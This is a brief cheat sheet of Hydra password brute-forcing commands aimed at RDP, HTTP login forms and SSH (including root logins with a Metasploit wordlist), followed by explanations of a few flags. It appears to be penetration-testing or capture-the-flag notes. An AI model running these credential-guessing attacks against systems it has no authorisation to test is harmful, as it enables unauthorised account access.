### RDP creds
hydra -V -f -l/-L <user/list> -p/-P <pass/list> rdp://<targetIP>

### HTTP login form
hydra -l/-L <user/list> -p/-P <pass/list> <victimIP> <formType> "<loginFormPath>:<data>:<errorMsg>" <verbosity>

### ssh creds
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<ip>:<port> -t 4 -V

Extra options:
	-f: Stop on the first correct combination
	-V: Verbose (print all combinations)
	-u: When using a userlist, this option tries one password on every user, 
	    before moving on to the next password. Default tries all passwords
	    for one user, before moving on to the next user.